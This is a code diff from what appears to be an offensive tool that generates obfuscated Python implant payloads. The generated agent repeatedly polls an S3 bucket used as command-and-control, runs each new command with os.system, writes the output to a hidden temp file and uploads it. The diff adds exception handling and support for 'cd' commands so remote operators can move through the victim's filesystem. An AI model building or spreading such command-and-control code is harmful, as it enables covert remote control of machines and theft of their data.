@@ -206,6 +206,7 @@ import requests
     check = m.randomString(10)
     com = m.randomString(5)
     body = m.randomString(6)
+    dd = m.randomString(4)
 
     payload += "def {0}():\n".format(func)
     payload += "    %s = %s\n" % (body, wss)
@@ -215,12 +216,21 @@ import requests
     payload += '    {0} = " > " + {1} + "/.{2}"\n'.format(save, temp, file)
     payload += '    {0} = "https://{1}.s3-{2}.amazonaws.com/{3}"'.format(get1, bucket, region_name, c2)
     payload += """                                                                                                                                                
-    while 1:                                                                                                                                                      
-        {1}= requests.get({0})                                                                                                                                    
-        {1}.text                                                                                                                                                  
-        {2} = {1}.text.strip()                                                                                                                                    
+    while 1:
+        try:                                                                                                                                                  
+            {1}= requests.get({0})                                                                                                                                    
+            {1}.text                                                                                                                                                  
+            {2} = {1}.text.strip()
+        except:
+            pass                                                                                                                                    
 \n""".format(get1, check, com)
     payload += "        if {0} != {1}:\n".format(com, old)
+    payload += "            if 'cd ' in {0}:\n".format(com)
+    payload += "                {0} = {1}.replace('cd ', '')\n".format(dd, com)
+    payload += "                try:\n"
+    payload += "                    os.chdir({0})\n".format(dd)
+    payload += "                except:\n"
+    payload += "                    pass\n"
     payload += "            os.system({0} + {1})\n".format(com, save)
     payload += "            with open({0}, 'rb') as f:\n".format(obj)
     payload += "                file = {'file': (%s, f)}\n" % obj
